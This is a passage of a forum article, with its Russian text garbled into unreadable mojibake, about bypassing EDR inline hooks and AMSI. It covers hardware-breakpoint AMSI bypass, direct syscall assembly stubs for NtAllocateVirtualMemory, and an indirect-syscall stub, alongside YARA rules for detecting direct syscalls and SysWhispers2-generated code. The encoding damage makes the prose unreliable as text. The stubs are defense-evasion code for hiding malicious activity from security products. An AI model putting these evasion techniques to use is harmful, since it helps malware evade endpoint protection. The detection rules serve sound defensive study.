–•–æ—Ç—è EDR –∏–º–µ–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ —É—Ä–æ–≤–Ω–µ–π –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è, –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π —Ö—É–∫ —è–≤–ª—è–µ—Ç—Å—è –æ–¥–Ω–∏–º –∏–∑ –æ—Å–Ω–æ–≤–Ω—ã—Ö.<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-apparatnaya-tochka-ostanova"></a>–ê–ø–ø–∞—Ä–∞—Ç–Ω–∞—è —Ç–æ—á–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–∞&#8203;<a class="hoverLink" href="#-apparatnaya-tochka-ostanova" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3>–í –º–æ–µ–π —Å—Ç–∞—Ç—å–µ &quot;–û–±—Ö–æ–¥ AMSI –Ω–∞ Windows 11&quot; (<a href="https://medium.com/@gustavshen/bypass-amsi-on-windows-11-75d231b2cac6" target="_blank" class="link link--external" rel="noopener">Bypass AMSI on Windows 11</a>) —è –æ–±–Ω–∞—Ä—É–∂–∏–ª, —á—Ç–æ –µ—Å–ª–∏ R8 —Ä–∞–≤–µ–Ω 0 –ø—Ä–∏ –≤—ã–∑–æ–≤–µ AmsiScanBuffer, AMSI –º–æ–∂–Ω–æ –æ–±–æ–π—Ç–∏. –û–¥–Ω–∞–∫–æ —è –æ—Ç–º–µ—Ç–∏–ª, —á—Ç–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç–æ—Ç –æ–±—Ö–æ–¥ –±–µ–∑ WinDBG –Ω–µ–ø—Ä–æ—Å—Ç–æ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797864885.png"
		data-src="https://osint42.org/attachments/1746797864885-png.352/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797864885-png.352/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797864885.png"
			title="1746797864885.png"
			width="927" height="976" loading="lazy" />
	</div><br />
<br />
–ù–∞ —Å–∞–º–æ–º –¥–µ–ª–µ, —ç—Ç–æ –≤–æ–∑–º–æ–∂–Ω–æ, –∏—Å–ø–æ–ª—å–∑—É—è –∞–ø–ø–∞—Ä–∞—Ç–Ω—É—é —Ç–æ—á–∫—É –æ—Å—Ç–∞–Ω–æ–≤–∞. –í —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ (<a href="https://ethicalchaos.dev/2022/04/17/in-process-patchless-amsi-bypass/" target="_blank" class="link link--external" rel="noopener">In-Process Patchless AMSI Bypass - Ethical Chaos</a>) –æ–±—ä—è—Å–Ω—è–µ—Ç—Å—è, –∫–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∞–ø–ø–∞—Ä–∞—Ç–Ω—É—é —Ç–æ—á–∫—É –æ—Å—Ç–∞–Ω–æ–≤–∞ –¥–ª—è –æ–±—Ö–æ–¥–∞ AMSI –±–µ–∑ –ø–∞—Ç—á–µ–π.<br />
–≠—Ç–æ –¥–æ—Å—Ç–∏–≥–∞–µ—Ç—Å—è –ø—É—Ç–µ–º —É—Å—Ç–∞–Ω–æ–≤–∫–∏ RAX –≤ 0, –∏–∑–º–µ–Ω–µ–Ω–∏—è –∞—Ä–≥—É–º–µ–Ω—Ç–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è AMSI –∏ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ RIP –∫–∞–∫ –∞–¥—Ä–µ—Å–∞ –≤–æ–∑–≤—Ä–∞—Ç–∞, –∫–æ–≥–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏–∏ AmsiScanBuffer. –í –Ω–∞—à–µ–º —Å–ª—É—á–∞–µ, –Ω–∞–º –ø—Ä–æ—Å—Ç–æ –Ω—É–∂–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å R8 –≤ 0.<br />
–Ø –Ω–µ –±—É–¥—É –∑–¥–µ—Å—å –ø–æ–¥—Ä–æ–±–Ω–æ –æ–±—ä—è—Å–Ω—è—Ç—å –æ—Å–Ω–æ–≤–Ω—ã–µ –∑–Ω–∞–Ω–∏—è –æ –∞–ø–ø–∞—Ä–∞—Ç–Ω–æ–π —Ç–æ—á–∫–µ –æ—Å—Ç–∞–Ω–æ–≤–∞ –∏ VEH, —Ç–∞–∫ –∫–∞–∫ –≤—ã –º–æ–∂–µ—Ç–µ –æ–∑–Ω–∞–∫–æ–º–∏—Ç—å—Å—è —Å –Ω–∏–º–∏ –≤ —Å—Ç–∞—Ç—å–µ, –∞ –æ–±—â–∞—è –∏–¥–µ—è –±–æ–ª–µ–µ –≤–∞–∂–Ω–∞.<br />
<br />
–¢–∞–∫–∂–µ –Ω–∞ —Ñ–æ—Ä—É–º–µ –µ—Å—Ç—å —Å—Ç–∞—Ç—å—è:–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ: –û–±—Ö–æ–¥ AMSI –ø—Ä–∏ –ø–æ–º–æ—â–∏ —Ö–∞—Ä–¥–≤–∞—Ä–Ω—ã—Ö —Ç–æ—á–µ–∫ –æ—Å—Ç–∞–Ω–æ–≤–∞ | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-nekotoryye-iz-sushchestvuyushchikh-podkhodov"></a>–ù–µ–∫–æ—Ç–æ—Ä—ã–µ –∏–∑ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö –ø–æ–¥—Ö–æ–¥–æ–≤&#8203;<a class="hoverLink" href="#-nekotoryye-iz-sushchestvuyushchikh-podkhodov" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3>–°–ª–µ–¥—É—é—â–∏–µ –ø–æ–¥—Ö–æ–¥—ã –º–æ–≥—É—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã –¥–ª—è –æ–±—Ö–æ–¥–∞ –≤—Å—Ç—Ä–æ–µ–Ω–Ω–æ–≥–æ —Ö—É–∫–∞. –£—á–∏—Ç—ã–≤–∞—è, —á—Ç–æ —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –º–Ω–æ–∂–µ—Å—Ç–≤–æ —Å—Ç–∞—Ç–µ–π, –ø–æ–¥—Ä–æ–±–Ω–æ –æ–ø–∏—Å—ã–≤–∞—é—â–∏—Ö –∏—Ö, –¥–∞–≤–∞–π—Ç–µ –∫—Ä–∞—Ç–∫–æ —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –∏–∑ –ø–æ–¥—Ö–æ–¥–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –æ–±–æ–π—Ç–∏ –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π —Ö—É–∫.<br />
<h4 class="bbHeading"><a class="u-anchorTarget" name="-pryamoi-sistemnyi-vyzov"></a>–ü—Ä—è–º–æ–π —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤&#8203;<a class="hoverLink" href="#-pryamoi-sistemnyi-vyzov" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h4>–ö–∞–∂–¥–∞—è Nt-–≤–µ—Ä—Å–∏—è Win32 API, —Ç–∞–∫–∞—è –∫–∞–∫ NtAllocateVirtualMemory, —Ç—Ä–µ–±—É–µ—Ç —Ç–æ–ª—å–∫–æ 4 –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ –¥–ª—è —Ä–∞–±–æ—Ç—ã, —ç—Ç–æ—Ç –Ω–∞–±–æ—Ä –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π –Ω–∞–∑—ã–≤–∞–µ—Ç—Å—è –∑–∞–≥–ª—É—à–∫–æ–π —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ (syscall stub). –ï–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω–æ–µ —Ä–∞–∑–ª–∏—á–∏–µ –º–µ–∂–¥—É —Ä–∞–∑–ª–∏—á–Ω—ã–º–∏ NTAPI - —ç—Ç–æ –∑–Ω–∞—á–µ–Ω–∏–µ –∏—Ö –Ω–æ–º–µ—Ä–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>mov r10, rcx
mov rax, [SSN]
syscall
ret</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746797901049.png"
		data-src="https://osint42.org/attachments/1746797901049-png.353/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797901049-png.353/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797901049.png"
			title="1746797901049.png"
			width="934" height="186" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797908279.png"
		data-src="https://osint42.org/attachments/1746797908279-png.354/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797908279-png.354/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797908279.png"
			title="1746797908279.png"
			width="933" height="185" loading="lazy" />
	</div><br />
<br />
<b><u>–í–æ—Ç –ø—Ä–∏–º–µ—Ä —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ —ç—Ç–æ–≥–æ –ø–æ–¥—Ö–æ–¥–∞:</u></b><br />
<br />
–í —Ñ–∞–π–ª–µ .asm –æ–ø—Ä–µ–¥–µ–ª–∏—Ç–µ –∑–∞–≥–ª—É—à–∫—É —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –¥–ª—è NtAllocateVirtualMemory:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>.code

&lt;...Other Stubs...&gt;

NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 18h
    syscall
    ret
NtAllocateVirtualMemory ENDP

&lt;...Other Stubs...&gt;

end</code></pre>
	</div>
</div><br />
–í–Ω—É—Ç—Ä–∏ —Ñ–∞–π–ª–∞ –∑–∞–≥–æ–ª–æ–≤–∫–∞ –∏–ª–∏ c/cpp —Ñ–∞–π–ª–∞ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –º–∞–∫—Ä–æ—Å EXTERN_C –¥–ª—è —Å–≤—è–∑—ã–≤–∞–Ω–∏—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–∏ —Å –∞—Å—Å–µ–º–±–ª–µ—Ä–Ω—ã–º –∫–æ–¥–æ–º –∑–∞–≥–ª—É—à–∫–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∏–º—è –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –æ–¥–∏–Ω–∞–∫–æ–≤—ã–º.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID * BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect);</code></pre>
	</div>
</div><br />
–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –º—ã –º–æ–∂–µ–º –Ω–∞–ø—Ä—è–º—É—é –∏–Ω–∏—Ü–∏–∏—Ä–æ–≤–∞—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤, –≤—ã–∑—ã–≤–∞—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é. –û–¥–Ω–∞–∫–æ —ç—Ç–æ—Ç –ø–æ–¥—Ö–æ–¥ –∏–º–µ–µ—Ç –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä—ã –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏ (IOCs):<br />
–ñ–µ—Å—Ç–∫–æ –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –∑–∞–≥–ª—É—à–∫–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞, –µ–µ —à–∞–±–ª–æ–Ω: 4c8bd1 c7c0&lt;DWORD&gt; 0f05c3.<br />
<br />
<b>–í–æ–∑–º–æ–∂–Ω–æ–µ –ø—Ä–∞–≤–∏–ª–æ Yara –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –ø—Ä—è–º–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤—ã–≥–ª—è–¥–∏—Ç —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º:</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>rule direct_syscall
{
    meta:
        description = &quot;Hunt for direct syscall&quot;

    strings:
        $s1 = {4c 8b d1 48 c7 c0 ?? ?? ?? ?? 0f 05 c3}
        $s2 = {4C 8b d1 b8 ?? ?? ?? ?? 0F 05 C3}
    condition:
        #s1 &gt;=1 or #s2 &gt;=1
}</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746797921000.png"
		data-src="https://osint42.org/attachments/1746797921000-png.355/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797921000-png.355/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797921000.png"
			title="1746797921000.png"
			width="1430" height="191" loading="lazy" />
	</div><br />
<br />
–•–æ—Ç—è –æ–±–æ–π—Ç–∏ —ç—Ç–æ—Ç —à–∞–±–ª–æ–Ω —Ç—Ä–∏–≤–∏–∞–ª—å–Ω–æ, –≤—Å—Ç–∞–≤–∏–≤ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏, –ø–æ–¥–æ–±–Ω—ã–µ NOP.<br />
<br />
–£ —ç—Ç–æ–≥–æ –ø–æ–¥—Ö–æ–¥–∞ –µ—Å—Ç—å –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ–∫: –º—ã –∂–µ—Å—Ç–∫–æ –∑–∞–∫–æ–¥–∏—Ä—É–µ–º –Ω–æ–º–µ—Ä —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤ –∏—Å—Ö–æ–¥–Ω–æ–º –∫–æ–¥–µ. –≠—Ç–æ –ø–ª–æ—Ö–æ —Ä–∞–±–æ—Ç–∞–µ—Ç, –∫–æ–≥–¥–∞ –≤ —Ü–µ–ª–µ–≤–æ–π –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –Ω–µ—Å–∫–æ–ª—å–∫–æ –≤–µ—Ä—Å–∏–π –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã, –ø–æ—Ç–æ–º—É —á—Ç–æ SSN (System Service Numbers) —Ä–∞–∑–ª–∏—á–∞—é—Ç—Å—è –≤ —Ä–∞–∑–Ω—ã—Ö –≤–µ—Ä—Å–∏—è—Ö –û–°.<br />
<br />
–ù–∞–±–æ—Ä –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ Syswhisper —Ä–µ—à–∞–µ—Ç —ç—Ç—É –ø—Ä–æ–±–ª–µ–º—É: Syswhisper 1 –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ—Ç –≤–µ—Ä—Å–∏—é –û–° —Ö–æ—Å—Ç–∞ –∏ –≤—ã–±–∏—Ä–∞–µ—Ç –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π SSN. Syswhisper 2 –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ –ø–æ–ª—É—á–∞–µ—Ç SSN –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è. –í –ª—é–±–æ–º —Å–ª—É—á–∞–µ, –ø—Ä—è–º–æ–π —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ —ç—Ç–∏—Ö –ø–æ–¥—Ö–æ–¥–∞—Ö.<br />
<br />
–ë–µ–∑ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–π –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ –∑–∞–≥–ª—É—à–∫–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ Syswhisper2 –≤–æ–∑–º–æ–∂–Ω–æ–µ –ø—Ä–∞–≤–∏–ª–æ Yara –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –≤—ã–≥–ª—è–¥–∏—Ç —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>rule syswhisper2
{
    meta:
        description = &quot;Hunt for syswhisper2 generated asm code&quot;

    strings:
        $s1 = {58 48 89 4C 24 08 48 89 54 24 10 4C 89 44 24 18 4C 89 4C 24 20 48 83 EC 28 8B 0D ?? ?? 00 00 E8 ?? ?? ?? ?? 48 83 C4 28 48 8B 4C 24 08 48 8B 54 24 10 4C 8B 44 24 18 4C 8B 4C 24 20 4C 8B D1 0F 05 C3}
    condition:
        #s1 &gt;=1
}</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746797981151.png"
		data-src="https://osint42.org/attachments/1746797981151-png.356/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797981151-png.356/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797981151.png"
			title="1746797981151.png"
			width="1413" height="134" loading="lazy" />
	</div><br />
<br />
–ü–æ–º–∏–º–æ —à–∞–±–ª–æ–Ω–∞ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç–µ–π –±–∞–π—Ç–æ–≤ –∑–∞–≥–ª—É—à–∫–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, <b><u>–≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ syscall —è–≤–ª—è–µ—Ç—Å—è –Ω–µ–Ω–æ—Ä–º–∞–ª—å–Ω—ã–º –¥–ª—è –ª–µ–≥–∏—Ç–∏–º–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã</u></b>, —Ç.–µ. —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –¥–æ–ª–∂–µ–Ω –∏–Ω–∏—Ü–∏–∏—Ä–æ–≤–∞—Ç—å—Å—è –≤–Ω—É—Ç—Ä–∏ –æ–±–ª–∞—Å—Ç–∏ –ø–∞–º—è—Ç–∏ ntdll.dll.<br />
<br />
–ù–∞–ø—Ä–∏–º–µ—Ä, –ø—Ä–∏ –≤—ã–∑–æ–≤–µ Win32 API SleepEx –≤ –ø—Ä–æ–≥—Ä–∞–º–º–µ –Ω–∞ C, –º—ã –º–æ–∂–µ–º –∑–∞–º–µ—Ç–∏—Ç—å —Å—Ç–µ–∫ –≤—ã–∑–æ–≤–æ–≤ —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º: sleep!main -&gt; kernelbase!SleepEx -&gt; ntdll!NtDelayExecution -&gt; ntoskrnl!KeDelayExecutionThread.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797988931.png"
		data-src="https://osint42.org/attachments/1746797988931-png.357/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797988931-png.357/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797988931.png"
			title="1746797988931.png"
			width="615" height="562" loading="lazy" />
	</div><br />
<br />
–û–¥–Ω–∞–∫–æ, –µ—Å–ª–∏ –º—ã –∏–Ω–∏—Ü–∏–∏—Ä—É–µ–º —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –Ω–∞–ø—Ä—è–º—É—é, —Å—Ç–µ–∫ –≤—ã–∑–æ–≤–æ–≤ –±—É–¥–µ—Ç —Å–ª–µ–¥—É—é—â–∏–º: sleep!main -&gt; sleep!NtDelayExecution -&gt; ntoskrnl!KeDelayExecutionThread.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797996506.png"
		data-src="https://osint42.org/attachments/1746797996506-png.358/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797996506-png.358/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797996506.png"
			title="1746797996506.png"
			width="620" height="570" loading="lazy" />
	</div><br />
<br />
<b><u>–õ–µ–≥–∫–æ –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å, —á—Ç–æ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏–Ω–∏—Ü–∏–∏—Ä—É–µ—Ç—Å—è –≤ –ø—Ä–æ–≥—Ä–∞–º–º–µ, –∞ –Ω–µ –≤ –º–æ–¥—É–ª–µ ntdll.</u></b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746798004479.png"
		data-src="https://osint42.org/attachments/1746798004479-png.359/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746798004479-png.359/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746798004479.png"
			title="1746798004479.png"
			width="684" height="195" loading="lazy" />
	</div><br />
<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-kosvennyi-sistemnyi-vyzov"></a>–ö–æ—Å–≤–µ–Ω–Ω—ã–π —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤&#8203;<a class="hoverLink" href="#-kosvennyi-sistemnyi-vyzov" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3>–ú—ã –æ–±—Å—É–¥–∏–ª–∏ –Ω–µ–¥–æ—Å—Ç–∞—Ç–∫–∏ –ø—Ä—è–º–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –ø–æ—ç—Ç–æ–º—É –º—ã —Ö–æ—Ç–∏–º –∏–∑–±–µ–∂–∞—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –Ω–∞–ø—Ä—è–º—É—é. –ö–æ—Å–≤–µ–Ω–Ω—ã–π —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ —è–≤–ª—è–µ—Ç—Å—è —É–ª—É—á—à–µ–Ω–∏–µ–º. –®–∞–±–ª–æ–Ω –∑–∞–≥–ª—É—à–∫–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –æ—á–µ–Ω—å –ø–æ—Ö–æ–∂ –Ω–∞ —à–∞–±–ª–æ–Ω –ø—Ä—è–º–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –æ–¥–Ω–∞–∫–æ, –≤–º–µ—Å—Ç–æ –Ω–µ–ø–æ—Å—Ä–µ–¥—Å—Ç–≤–µ–Ω–Ω–æ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∑–∞–≥–ª—É—à–∫–∞ –∫–æ—Å–≤–µ–Ω–Ω–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –±–µ–∑—É—Å–ª–æ–≤–Ω—ã–π –ø–µ—Ä–µ—Ö–æ–¥ –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ –∞–¥—Ä–µ—Å—É –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, (ssn of NtAllocateVirtualMemory)
    jmp (address of a syscall instruction)
    ret
NtAllocateVirtualMemory ENDP</code></pre>
	</div>
</div><br />
